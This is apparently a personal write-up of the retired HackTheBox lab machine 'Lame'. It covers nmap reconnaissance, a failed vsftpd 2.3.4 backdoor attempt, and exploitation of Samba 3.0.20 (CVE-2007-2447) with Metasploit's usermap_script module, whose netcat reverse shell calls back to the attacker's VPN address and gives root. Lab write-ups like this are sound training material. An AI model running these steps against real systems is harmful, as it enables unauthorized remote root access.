# LAME - Easy

**Date Completed:** February 15, 2026  
**Difficulty:** Easy  
**Status:** ✅ COMPLETE

---

## Box Information

| Property | Value |
|----------|-------|
| OS | Linux |
| IP | 10.10.10.3 |
| Release Date | March 14, 2017 |
| Retired | Yes |

**Key Services:** FTP (vsftpd 2.3.4), SSH, SMB (Samba 3.0.20), distccd

---

## Phase 1: Initial Reconnaissance

### Step 1: Service Enumeration Scan

**Command:**
```bash
nmap -sV -sC 10.10.10.3
```

**Explanation:**
- `-sV`: Service version detection
- `-sC`: Default NSE scripts (banner grabbing, enumeration)

**Results:**
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst:
|   STAT:
|   FTP server status:
|     Connected to 10.10.14.24
|     Logged in as ftp
|     TYPE: ASCII
|     No session bandwidth limit
|     Session timeout in seconds is 300
|     Control connection is plain text
|     Data connections will be plain text
|     vsFTPd 2.3.4 - secure, fast, stable
|_  End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-07-22T05:32:33-04:00
```

### Step 2: Key Findings Summary

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 21 | FTP | vsftpd 2.3.4 | Anonymous login allowed |
| 22 | SSH | OpenSSH 4.7p1 | Debian 8ubuntu1 |
| 139 | NetBIOS-SSN | Samba smbd 3.X-4.X | SMB over NetBIOS |
| 445 | NetBIOS-SSN | Samba smbd 3.0.20-Debian | Direct SMB |
| 3632 | distccd | distccd v1 | GNU 4.2.4 |

**Critical Observations:**
- SMB message signing **disabled** (dangerous)
- SMB2 protocol negotiation **failed** (older SMB version)
- Anonymous FTP access allowed
- Multiple potentially vulnerable services

---

## Phase 2: FTP Enumeration (Dead End)

### Step 1: Anonymous FTP Access

**Finding:** Anonymous FTP login allowed (confirmed by nmap)

**Attempt:** Connected to FTP server as anonymous user

**Result:** Empty directory — nothing useful to retrieve or exploit via FTP content

### Step 2: vsftpd 2.3.4 Backdoor Exploit Attempt

**Vulnerability Research:**
- **CVE:** CVE-2011-2523
- **Description:** vsftpd 2.3.4 backdoor — malicious code was inserted into the vsftpd source code, allowing attackers to gain a shell by sending a specific string

**Metasploit Exploitation:**
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.3
exploit
```

**Result:**
```
[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created
```

**Conclusion:** Exploit failed — backdoor not present or patched on this version. Time to pivot.

---

## Phase 3: SMB Enumeration

### Step 1: Share Enumeration

**Command:**
```bash
smbclient -L -N \\\\10.10.10.3
```

**Explanation:**
- `-L`: List available shares
- `-N`: Null session (no password)

**Key Finding:** Samba version **3.0.20** identified

### Step 2: Vulnerability Research

**Google Search:** "Samba 3.0.20 exploit"

**Finding:**
- **CVE:** CVE-2007-2447
- **Name:** Samba "username map script" Command Execution
- **Description:** The MS-RPC functionality in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function when the "username map script" smb.conf option is enabled

**Metasploit Module:** `exploit/multi/samba/usermap_script`

---

## Phase 4: Exploitation - Samba usermap_script

### Step 1: Metasploit Configuration

```bash
msfconsole
search usermap_script
use exploit/multi/samba/usermap_script
```

### Step 2: Module Options

```bash
msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s)
   RPORT   139              yes       The target port (TCP)

Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address
   LPORT  4444             yes       The listen port
```

### Step 3: Configure and Exploit

```bash
set RHOSTS 10.10.10.3
set LHOST <tun0_IP>
exploit
```

⚠️ **Critical Lesson Learned:** Initially failed to get a connection because I used the **wrong IP** for LHOST. 

**ALWAYS use your tun0 (VPN) IP for LHOST, not eth0 or localhost!**

```bash
# Check your tun0 IP
ip addr show tun0
```

### Step 4: Successful Exploitation

After correcting LHOST to the tun0 IP:

```
[*] Started reverse TCP handler on <tun0_IP>:4444 
[*] Command shell session 1 opened (<tun0_IP>:4444 -> 10.10.10.3:XXXXX)
```

**Result:** Shell obtained!

---

## Phase 5: Post-Exploitation & Flag Retrieval

### Step 1: Privilege Verification

```bash
whoami
```

**Result:** `root`

🎉 **Immediate root access!** No privilege escalation required — the Samba exploit provided direct root shell.

### Step 2: User Flag

```bash
cat /home/makis/user.txt
```

**User Flag:** ✅ Retrieved

### Step 3: Root Flag

```bash
cat /root/root.txt
```

**Root Flag:** ✅ Retrieved

---

## Exploitation Chain Summary

```
1. Reconnaissance     → nmap -sV -sC reveals FTP, SSH, SMB, distccd
2. FTP Enumeration    → Anonymous allowed but empty; vsftpd backdoor fails
3. SMB Enumeration    → Samba 3.0.20 identified
4. Vulnerability ID   → CVE-2007-2447 (usermap_script)
5. Exploitation       → Metasploit exploit/multi/samba/usermap_script
6. Root Access        → Direct root shell (no privesc needed)
7. Flags Retrieved    → user.txt + root.txt
```

---

## Key Techniques & Tools

| Technique | Tool/Command | Purpose |
|-----------|--------------|---------|
| Service Enumeration | `nmap -sV -sC` | Identify services, versions, and run default scripts |
| FTP Enumeration | Anonymous login | Check for accessible files |
| FTP Exploitation | Metasploit vsftpd_234_backdoor | Attempt known backdoor (failed) |
| SMB Enumeration | `smbclient -L -N` | List shares, identify version |
| SMB Exploitation | Metasploit usermap_script | CVE-2007-2447 command execution |
| Post-Exploitation | `whoami`, `cat` | Verify access, retrieve flags |

---

## Vulnerabilities Exploited

| CVE | Service | Description | Result |
|-----|---------|-------------|--------|
| CVE-2011-2523 | vsftpd 2.3.4 | Backdoor command execution | ❌ Failed |
| CVE-2007-2447 | Samba 3.0.20 | Username map script command injection | ✅ Root shell |

---

## Critical Lessons Learned

### 1. LHOST IP Selection (Most Important!)

**Problem:** Exploit ran but no session was created.

**Root Cause:** Used wrong IP for LHOST — must use **tun0 (VPN) IP**, not eth0 or localhost.

**Solution:**
```bash
# Always verify your VPN IP before exploitation
ip addr show tun0

# Use this IP for LHOST in Metasploit
set LHOST <tun0_IP>
```

**Why This Matters:**
- HTB machines are on the HTB network, accessible only via VPN
- Your attacking machine connects via tun0 interface
- The target needs to connect BACK to you on tun0
- Using eth0/localhost = target cannot reach you = no shell

### 2. Pivot When Exploits Fail

The vsftpd 2.3.4 backdoor (CVE-2011-2523) is a well-known vulnerability, but:
- Not all versions are vulnerable (backdoor was in specific compromised source)
- Always have backup attack vectors ready
- Multiple open ports = multiple opportunities

### 3. Old Software = Easy Targets

Samba 3.0.20 is from 2007 — nearly 20 years old:
- Known vulnerabilities are well-documented
- Metasploit modules readily available
- Google + version number = quick CVE identification

### 4. Direct Root Access Happens

Not every box requires privilege escalation:
- Service running as root = root shell on exploitation
- Always check `whoami` immediately after shell access
- Don't waste time on privesc if already root

---

## Alternative Attack Vectors (Not Explored)

| Port | Service | Potential Exploit |
|------|---------|-------------------|
| 3632 | distccd | CVE-2004-2687 — distccd command execution |
| 22 | SSH | Brute force (if credentials found) |

---

## Status

✅ **BOX PWNED**

| Objective | Status |
|-----------|--------|
| User Flag | ✅ Retrieved |
| Root Flag | ✅ Retrieved |
| Method | SMB usermap_script (CVE-2007-2447) |
| Final Access | Root |

**Key Takeaway:** Always verify your LHOST IP is set to tun0 when exploiting HTB machines. This simple mistake can waste significant time troubleshooting why sessions aren't being created.
